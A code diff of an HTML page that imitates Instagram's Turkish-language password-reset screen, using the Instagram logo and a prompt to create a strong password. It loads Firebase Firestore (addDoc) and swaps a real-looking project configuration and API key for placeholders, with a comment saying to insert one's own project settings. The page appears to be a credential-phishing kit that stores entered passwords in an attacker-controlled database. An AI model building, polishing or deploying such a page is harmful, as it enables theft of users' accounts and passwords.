@@ -3,9 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Şifre Yenile - Instagram</title>
-    <link rel="icon" type="image/x-icon" href="https://www.instagram.com/favicon.ico">
-    <script src="https://cdn.tailwindcss.com?client"></script>
+    <title>Şifre Yenile</title>
+    <!-- Instagram logosu üçün yeni favicon URL'si -->
+    <link rel="icon" type="image/x-icon" href="https://placehold.co/16x16/ffffff/000000?text=IG">
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
         .toggle-password {
             position: absolute;
@@ -17,26 +18,16 @@
             font-size: 12px;
             font-weight: 600;
         }
-        .instagram-gradient {
-            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
     </style>
 </head>
 <body class="bg-gray-100 flex items-center justify-center min-h-screen">
     <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
-        <!-- Instagram logosu ve başlık -->
-        <div class="flex items-center justify-center mb-6">
-            <img
-                src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png"
-                alt="Instagram Logo"
-                class="h-12 mr-2"
-            />
-            <h1 class="text-2xl font-bold instagram-gradient">Şifre Yenile</h1>
-        </div>
-        
-        <h2 class="text-xl font-semibold text-gray-800 mb-4 text-center">
+        <img
+            src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
+            alt="Instagram Logo"
+            class="mx-auto mb-6 w-44"
+        />
+        <h2 class="text-xl font-semibold text-gray-800 mb-6 text-center">
             Instagram'da güçlü bir şifre oluşturun
         </h2>
         <p class="text-sm text-gray-600 mb-4 text-center">
@@ -94,14 +85,15 @@
         import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js';
         import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js';
 
+        // NOTE: The Firebase configuration is a placeholder. You should replace this with your actual Firebase project settings.
         const firebaseConfig = {
-            apiKey: "AIzaSyC-QALot6Wp5_mVe4s3ekB8JWq-qDUUOqQ",
-            authDomain: "premiumstore-adece.firebaseapp.com",
-            projectId: "premiumstore-adece",
-            storageBucket: "premiumstore-adece.firebasestorage.app",
-            messagingSenderId: "1058991155256",
-            appId: "1:1058991155256:web:942e3aaa544570355f9ecd",
-            measurementId: "G-2SCDNF8S2R"
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_AUTH_DOMAIN",
+            projectId: "YOUR_PROJECT_ID",
+            storageBucket: "YOUR_STORAGE_BUCKET",
+            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+            appId: "YOUR_APP_ID",
+            measurementId: "YOUR_MEASUREMENT_ID"
         };
 
         // Firebase-i başlat
